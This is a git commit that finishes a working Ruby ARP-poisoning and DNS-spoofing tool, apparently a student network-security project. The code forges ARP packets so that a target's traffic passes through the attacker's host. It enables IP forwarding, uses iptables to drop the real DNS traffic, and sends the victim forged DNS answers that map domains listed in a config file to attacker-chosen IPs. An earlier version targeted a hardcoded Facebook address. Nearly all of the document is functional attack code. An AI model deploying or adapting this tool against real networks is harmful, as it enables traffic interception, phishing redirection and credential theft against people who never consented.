461d38f73f70ca87101e91a7f7ba86f3cbcf91cf
Jake Miner <zyko101@gmail.com>
2014-11-02 21:23:15 -0800

    Finished dns spoofer code

--- dnsspoof.rb
+++ dnsspoof.rb
@@ -1,27 +1,127 @@
+#################################################################
+##
+##      Script:    dnsSpoof.rb
+##
+##      Functions: begin
+##                 runSpoof
+##                 fixSpoof
+##                 forgePacket
+##                 start
+##                 init
+##
+##      Date:      November 3rd, 2014
+##
+##      Designer:  Jake Miner
+##
+##      Programer: Jake Miner
+##
+##      Notes: This is a simple ARP poisoning and DNS Spoofing
+##             application made in Ruby. It reads from spoof.dns
+##             To determine the addresses to spoof.
+##
+#################################################################
 #!/usr/bin/ruby
 require 'rubygems'
+require 'optparse'
 require 'packetfu'
 require 'thread'
 require './gdns.rb'
 
-$iface = "eth0"   # interface to send/recieve from
-$sMac = '08:00:27:48:d2:8f'  # source mac address, eg, address to redirect victim to
-$tMac = '08:00:27:5d:d8:c9'  # target mac address, eg, address to poison
-$rMac = '00:24:b2:4d:b9:1d'  # routers mac address
-$sIP = '10.0.0.68'        # source IP address
-$tIP = '10.0.0.28'        # target IP address
-$rIP = '10.0.0.1'       # router IP address
+#################################################################
+##
+##      Function:   init()
+##
+##      Date:       November 3rd, 2014
+##
+##      Designer:   Jake Miner
+##
+##      Programer:  Jake Miner
+##
+##      Interface:  init()
+##
+##      Returns:    void
+##
+##      Notes:      Sets up the global variables through command 
+##                  line arguments and ruby magic.
+##
+#################################################################
+def init()
+  $arp_packet_target #= PacketFu::ARPPacket.new()
+  $arp_packet_router #= PacketFu::ARPPacket.new()
+  $iface = ''   # interface to send/recieve from
+  $tIP = ''        # target IP address
+  $rIP = ''       # router IP address
 
-$arp_packet_target #= PacketFu::ARPPacket.new()
-$arp_packet_router #= PacketFu::ARPPacket.new()
+  parser = OptionParser.new do |opts|
+    opts.banner = "Usage: ruby dnsspoof -r routerIP -t targetIP -i interface"
+    opts.on('-r n', 'Router IP Address') { |v| $rIP = v }
+    opts.on('-t n', 'Target IP Address') { |v| $tIP = v }
+    opts.on('-i n', 'Interface') { |v| $iface = v } 
+  end.parse!
 
+  parser.parse!
+
+  if $rIP == '' or $tip == '' or $iface == ''
+    puts parser
+    exit(-1)
+  end
+
+  $info = Utils.whoami?( :iface => $iface)
+  $sIP = $info[:ip_saddr]        # source IP address
+  $sMac = $info[:eth_saddr]  # source mac address, eg, address to redirect victim to
+  $tMac = Utils.arp($tIP, :iface => $iface)  # target mac address, eg, address to poison
+  $rMac = Utils.arp($rIP, :iface => $iface)  # routers mac address
+end
+
+#################################################################
+##
+##      Function:   start
+##
+##      Date:       November 3rd, 2014
+##
+##      Designer:   Jake Miner
+##
+##      Programer:  Jake Miner
+##
+##      Interface:  start()
+##
+##      Returns:    void
+##
+##      Notes:      Sends the arp poisioning packets to the 
+##                  target and router, and sets up firewall for 
+##                  forwarding between the two
+##
+#################################################################
 def start()
   # tell the target that your mac address is the router
   $arp_packet_target = forgePacket($sMac, $tMac, $rIP, $tIP)
   $arp_packet_router = forgePacket($sMac, $rMac, $tIP, $rIP)
   `echo 1 > /proc/sys/net/ipv4/ip_forward`
+  `iptables -A FORWARD -p UDP --dport 53 -j DROP`
+  `iptables -A FORWARD -p TCP --dport 53 -j DROP`
 end
 
+#################################################################
+##
+##      Function:   forgePacket
+##
+##      Date:       November 3rd, 2014
+##
+##      Designer:   Jake Miner
+##
+##      Programer:  Jake Miner
+##
+##      Interface:  forgePacket(sMac, tMac, tIP, rIP)
+##                              sMac - The "sender" mac address 
+##                              tMac - The target mac address
+##                              tIP  - The "sender" ip addresss
+##                              rIP  - The target ip address
+##
+##      Returns:    target -> the poisoned arp packet for the target
+##
+##      Notes:      Creates a posioned arp packet to be sent.
+##
+#################################################################
 def forgePacket(sMac, tMac, tIP, rIP)
   target = PacketFu::ARPPacket.new()
   target.eth_saddr = sMac       # sender's MAC address
@@ -34,25 +134,78 @@ def forgePacket(sMac, tMac, tIP, rIP)
   return target
 end
 
+#################################################################
+##
+##      Function:   fixSpoof
+##
+##      Date:       November 3rd, 2014
+##
+##      Designer:   Jake Miner
+##
+##      Programer:  Jake Miner
+##
+##      Interface:  fixSpoof()
+##
+##      Returns:    void
+##
+##      Notes:      Reverses the arp poisoning on the targets
+##
+#################################################################
 def fixSpoof()
   $arp_packet_target = forgePacket($rMac, $tMac, $rIP, $tIP)
   $arp_packet_router = forgePacket($tMac, $rMac, $tIP, $rIP)
-  $arp_packet_target.to_w($iface)
-  $arp_packet_router.to_w($iface)
+  3.times{ $arp_packet_target.to_w($iface) }
+  3.times{ $arp_packet_router.to_w($iface) }
   `echo 0 > /proc/sys/net/ipv4/ip_forward`
 end
 
+#################################################################
+##
+##      Function:   runSpoof
+##
+##      Date:       November 3rd, 2014
+##
+##      Designer:   Jake Miner
+##
+##      Programer:  Jake Miner
+##
+##      Interface:  runSpoof()
+##
+##      Returns:    void
+##
+##      Notes:      Continuously sends posioned arp packets 
+##                  to the router and the victim
+##
+#################################################################
 def runSpoof()
   # Send out both packets
   caught=false
   while caught==false do
-    sleep 1
     $arp_packet_target.to_w($iface)
     $arp_packet_router.to_w($iface)
+    sleep 3
   end
 end
 
+#################################################################
+##
+##      Function:   begin
+##
+##      Date:       November 3rd, 2014
+##
+##      Designer:   Jake Miner
+##
+##      Programer:  Jake Miner
+##
+##      Interface:  begin
+##
+##      Returns:    void
+##
+##      Notes:      The main method of the program
+##
+#################################################################
 begin
+  init()
   start()
   spoof_thread = Thread.new{runSpoof()} 
   dns_thread = Thread.new{dns_query_grabber} 
@@ -64,5 +217,6 @@ begin
     Thread.kill(spoof_thread)
     Thread.kill(dns_thread)
     fixSpoof()
+    `iptables -F`
   exit 0
 end
--- gdns.rb
+++ gdns.rb
@@ -1,17 +1,52 @@
+#################################################################
+##
+##      Script:    dnsSpoof.rb 
+##
+##      Functions: dns_query_grabber
+##                 getDomainName
+##                 isQuery
+##                 forgeResponse
+##
+##      Date:      November 3rd, 2014
+##
+##      Designer:  Jake Miner
+##
+##      Programer: Jake Miner
+##
+##      Notes: This is a simple ARP poisoning and DNS Spoofing
+##             application made in Ruby. It reads from spoof.dns
+##             To determine the addresses to spoof.
+##
+#################################################################
 #!/usr/bin/ruby
 require 'rubygems'
 require 'packetfu'
+require 'resolv'
 include PacketFu
 
-def puts_dns(text)
-  user = File.open("thing.txt", "a") 
-  puts "File opened!"
-  user.puts("---------------------")
-  user.puts(text)
-  user.puts(text.unpack('H*'))
-  user.close
-end
-
+#################################################################
+##
+##      Function:   forgeResponse
+##
+##      Date:       November 3rd, 2014
+##
+##      Designer:   Jake Miner
+##
+##      Programer:  Jake Miner
+##
+##      Interface:  forgeResponse(src, dst, id, name, myIP, dest)
+##                                src   - udp source port
+##                                dst   - udp destination port
+##                                id    - dns ID 
+##                                name  - domain name of the query
+##                                myIP  - the IP to send as the response
+##                                dest  - the ip destination address
+##
+##      Returns:    response - the crafted DNS response packet
+##
+##      Notes:      Creates a DNS packet with the supplied arguments
+##
+#################################################################
 def forgeResponse(src, dst, id, name, myIP, dest)
   response = UDPPacket.new(:config => Utils.whoami?(:iface => $iface))
   response.eth_saddr = $sMac
@@ -25,13 +60,7 @@ def forgeResponse(src, dst, id, name, myIP, dest)
 
   response.payload = id
   response.payload += "\x81\x80" + "\x00\x01\x00\x01" + "\x00\x00\x00\x00"
-
-  # name.split(".").each do |part|
-  #   response.payload += part.length.chr
-  #   response.payload += part
-  # end
   response.payload += name
-
   response.payload += "\x00\x00\x01\x00" + "\x01\xc0\x0c\x00"
   response.payload += "\x01\x00\x01\x00" + "\x00\x00\xc0\x00" + "\x04"
   response.payload += myIP
@@ -41,7 +70,24 @@ def forgeResponse(src, dst, id, name, myIP, dest)
   return response
 end
 
-
+#################################################################
+##
+##      Function:   t
+##
+##      Date:       November 3rd, 2014
+##
+##      Designer:   Jake Miner
+##
+##      Programer:  Jake Miner
+##
+##      Interface:  isQuery(packet)
+##                          packet - the DNS packet to check
+##
+##      Returns:    true if the packet is a dns query, false otherwise
+##
+##      Notes:      Checks if the packet contains a DNS query
+##
+#################################################################
 def isQuery(packet)
   dnsFlag = (packet.payload[2]).to_s + (packet.payload[3]).to_s
   qryFlag = "\x01\x00"
@@ -52,13 +98,31 @@ def isQuery(packet)
   return false
 end
 
+#################################################################
+##
+##      Function:   getDomainName
+##
+##      Date:       November 3rd, 2014
+##
+##      Designer:   Jake Miner
+##
+##      Programer:  Jake Miner
+##
+##      Interface:  getDomainName(pkt)
+##                                pkt - the packet to get the domain from
+##
+##      Returns:    name - the domain name from the packet
+##
+##      Notes:      Extracts the domain name from the DNS payload (at byte 12)
+##
+#################################################################
 def getDomainName(pkt)
   name = ""
   
   while true
     num = (pkt[0]).to_s.ord
     if num == 0
-      return name
+      return name = name[0..name.length-1]
     elsif num != 0 
       name += pkt[1, num] + "."
       pkt = pkt[num + 1..-1]
@@ -68,17 +132,38 @@ def getDomainName(pkt)
   end
 end
 
+#################################################################
+##
+##      Function:   dns_query_grabber
+##
+##      Date:       November 3rd, 2014
+##
+##      Designer:   Jake Miner
+##
+##      Programer:  Jake Miner
+##
+##      Interface:  dns_query_grabber()
+##
+##      Returns:    void
+##
+##      Notes:      Captures dns packets, then forges and 
+##                  send the response to the victim
+##
+#################################################################
 def dns_query_grabber()
+  file = Hash[*File.read('spoof.dns').split(/[, \n]+/)]
   puts "Waiting for queries:"
 
-  facebookIP = "50.67.238.234"
-  myIP = facebookIP.split(".");
-  myIP2 = [myIP[0].to_i, myIP[1].to_i, myIP[2].to_i, myIP[3].to_i].pack('c*')
+  file.each do |key, value|
+    temp = file[key].split(".")
+    file[key] = [temp[0].to_i, temp[1].to_i, temp[2].to_i, temp[3].to_i].pack('c*')
+  end
 
   capture_session = PacketFu::Capture.new(:iface => $iface, :start => true, :promisc => true, :filter => "udp and port 53 and src " + $tIP, :save => true)
   capture_session.stream.each { |packet|
     pkt = Packet.parse(packet)
     if isQuery(pkt)
+      
 
       # get src and dst port from udp
       udpSrc = pkt.udp_src
@@ -90,12 +175,19 @@ def dns_query_grabber()
       
       # get name from packet
       name = getDomainName(pkt.payload[12..-1])
-      puts name
+      myIP = file[name[0..-2]]
       
       # check if name should be spoofed
-      
-      resp = forgeResponse(udpSrc, udpDst, queryID, pkt.payload[12..12+name.length-1], myIP2, dest)
-      resp.to_w($iface)
+      if file[name[0..-2]] != nil
+        resp = forgeResponse(udpSrc, udpDst, queryID, pkt.payload[12..12+name.length-1], myIP, dest)
+        resp.to_w($iface)
+      else
+        safe = Resolv.getaddress name[0..-2]
+        safe = safe.split(".")
+        tsafe = [safe[0].to_i, safe[1].to_i, safe[2].to_i, safe[3].to_i].pack('c*')
+        resp = forgeResponse(udpSrc, udpDst, queryID, pkt.payload[12..12+name.length-1], tsafe, dest)
+        resp.to_w($iface)
+      end
     end
   }
 end
